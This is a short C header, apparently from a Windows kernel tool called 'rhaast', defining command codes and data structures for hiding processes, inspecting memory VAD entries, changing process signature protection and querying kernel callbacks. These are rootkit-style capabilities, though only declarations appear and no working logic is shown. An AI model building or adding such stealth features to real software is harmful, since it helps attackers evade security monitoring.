#pragma once

#include <Native.h>
#include <Types.h>
#include <Callbacks.h>

/* rhaast commands */
#define RHAAST_COMMAND_PROCESS_HIDE     0x501
#define RHAAST_COMMAND_PROCESS_UNHIDE   0x502  
#define RHAAST_COMMAND_MEMORY_VAD       0x503
#define RHAAST_COMMAND_PROCESS_PROTECT  0x504
#define RHAAST_COMMAND_CALLBACK_QUERY   0x505

/* command data objects */
typedef struct _RS_C_MEMORY_VAD
{
    ULONG     Pid;
    ULONG_PTR Address;
} RS_C_MEMORY_VAD, * PRS_C_MEMORY_VAD;

typedef struct _RS_C_PROCESS_PROTECTION
{
    ULONG             Pid;
    PS_SIG_PROTECTION SignatureProtection; 
} RS_C_PROCESS_PROTECTION, *PRS_C_PROCESS_PROTECTION;

typedef struct _RS_C_CALLBACK_QUERY
{
    ULONG Type;
    ULONG Size;
} RS_C_CALLBACK_QUERY, *PRS_C_CALLBACK_QUERY;